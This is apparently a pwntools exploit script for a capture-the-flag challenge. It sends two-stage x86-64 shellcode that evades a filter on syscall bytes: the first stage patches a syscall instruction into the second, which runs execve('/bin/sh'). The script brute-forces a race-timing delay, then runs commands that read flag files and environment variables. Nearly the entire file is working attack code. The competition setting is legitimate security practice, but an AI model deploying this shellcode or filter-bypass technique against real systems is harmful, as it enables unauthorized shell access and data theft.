#!/usr/bin/env python3
from pwn import *
import argparse, struct, time, re, random

context.arch = "amd64"
context.log_level = "warning"

HOST = "upr.challs.ctf.bhackari.it"
PORT = 5002

ADDR2 = 0x13371337000
SYSCALL_OFF_EXECVE = 13
SYSCALL_OFF_EXIT = 9

BAD = [b"\x0f\x05", b"\x0f\x07", b"\x0f\x34", b"\xcd\x80"]

def clean(sc):
    assert len(sc) <= 64, len(sc)
    sc = sc.ljust(64, b"\x90")
    for bad in BAD:
        assert bad not in sc, (bad.hex(), sc.hex())
    return sc

def stage1_wait_patch(delay, off):
    target = ADDR2 + off

    sc = b""

    if delay:
        sc += b"\xb9" + p32(delay)        # mov ecx, delay
        sc += b"\xe2\xfe"                 # loop $

    sc += b"\x48\xba" + p64(target)       # mov rdx, target

    # wait until copied placeholder is present:
    # cmp word ptr [rdx], 0x9090
    # jne wait
    sc += b"\x66\x81\x3a\x90\x90"         # cmp word ptr [rdx], 0x9090
    sc += b"\x75\xf9"                     # jne -7

    # ax = 0x050f, tanpa byte literal 0f05 berurutan
    sc += b"\x31\xc0"                     # xor eax,eax
    sc += b"\xb0\x0f"                     # mov al,0x0f
    sc += b"\xb4\x05"                     # mov ah,0x05
    sc += b"\x66\x89\x02"                 # mov word ptr [rdx], ax
    sc += b"\xeb\xfe"                     # hang

    return clean(sc)

def stage2_execve():
    sc  = b"\x31\xd2"                                # xor edx,edx
    sc += b"\x31\xf6"                                # xor esi,esi
    sc += b"\x48\x8d\x3d\x08\x00\x00\x00"            # lea rdi,[rip+8]
    sc += b"\xb0\x3b"                                # mov al,59
    assert len(sc) == SYSCALL_OFF_EXECVE
    sc += b"\x90\x90"                                # patched to syscall
    sc += b"\xeb\xfe"                                # if not patched, spin
    sc += b"/bin/sh\x00"
    return clean(sc)

def stage2_exit42():
    sc  = b"\x31\xff"                 # xor edi,edi
    sc += b"\x40\xb7\x2a"             # mov dil,42
    sc += b"\x31\xc0"                 # xor eax,eax
    sc += b"\xb0\x3c"                 # mov al,60
    assert len(sc) == SYSCALL_OFF_EXIT
    sc += b"\x90\x90"                 # patched to syscall
    sc += b"\xeb\xfe"
    return clean(sc)

def start(args):
    if args.remote:
        return remote(args.host, args.port, timeout=args.timeout)
    return process(args.binary)

def attempt_shell(args, delay):
    io = start(args)

    io.recvuntil(b"Give me your shellcode:", timeout=args.timeout)
    io.send(stage1_wait_patch(delay, SYSCALL_OFF_EXECVE))

    io.recvuntil(b"Give me your shellcode:", timeout=args.timeout)
    io.send(stage2_execve())

    time.sleep(args.after)

    cmd = (
        b"echo __PWNED__; "
        b"cat /flag 2>/dev/null; "
        b"cat flag.txt 2>/dev/null; "
        b"env | grep -i flag; "
        b"id; "
        b"echo __END__\n"
    )

    try:
        io.send(cmd)
    except Exception:
        pass

    out = b""
    try:
        out = io.recvrepeat(args.wait)
    except Exception:
        pass

    try:
        io.close()
    except Exception:
        pass

    return out

def attempt_exit(args, delay):
    io = start(args)

    io.recvuntil(b"Give me your shellcode:", timeout=args.timeout)
    io.send(stage1_wait_patch(delay, SYSCALL_OFF_EXIT))

    io.recvuntil(b"Give me your shellcode:", timeout=args.timeout)
    io.send(stage2_exit42())

    time.sleep(args.after)

    out = b""
    try:
        out = io.recvrepeat(args.wait)
    except Exception:
        pass

    code = None
    try:
        code = io.poll(block=False)
    except Exception:
        pass

    try:
        io.close()
    except Exception:
        pass

    return code, out

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--remote", action="store_true")
    ap.add_argument("--host", default=HOST)
    ap.add_argument("--port", type=int, default=PORT)
    ap.add_argument("--binary", default="./build/chall")
    ap.add_argument("--timeout", type=float, default=1.0)
    ap.add_argument("--wait", type=float, default=0.25)
    ap.add_argument("--after", type=float, default=0.02)

    ap.add_argument("--test-exit", action="store_true")
    ap.add_argument("--dmin", type=int, default=0)
    ap.add_argument("--dmax", type=int, default=5000000)
    ap.add_argument("--dstep", type=int, default=100)
    ap.add_argument("--shuffle", action="store_true")
    args = ap.parse_args()

    delays = list(range(args.dmin, args.dmax + 1, args.dstep))
    if args.shuffle:
        random.shuffle(delays)

    for idx, d in enumerate(delays, 1):
        try:
            if args.test_exit:
                code, out = attempt_exit(args, d)
                if code == 42:
                    print(f"[+] LOCAL PATCH WIN delay={d}")
                    print(f"    sekarang jalankan remote pakai sekitar delay ini")
                    return
            else:
                out = attempt_shell(args, d)
                if out:
                    txt = out.decode("latin-1", "ignore")
                    if "__PWNED__" in txt or "uid=" in txt or "bhackariCTF{" in txt:
                        print(f"[+] SHELL WIN delay={d}")
                        print(txt)
                        m = re.search(rb"bhackariCTF\{[^}\n]+\}", out)
                        if m:
                            print(f"<FLAG>{m.group(0).decode()}</FLAG>")
                        return
        except KeyboardInterrupt:
            raise
        except Exception:
            pass

        if idx % 100 == 0:
            print(f"[*] tried {idx}/{len(delays)} last_delay={d}", flush=True)

    print("[-] belum kena di range ini")

if __name__ == "__main__":
    main()
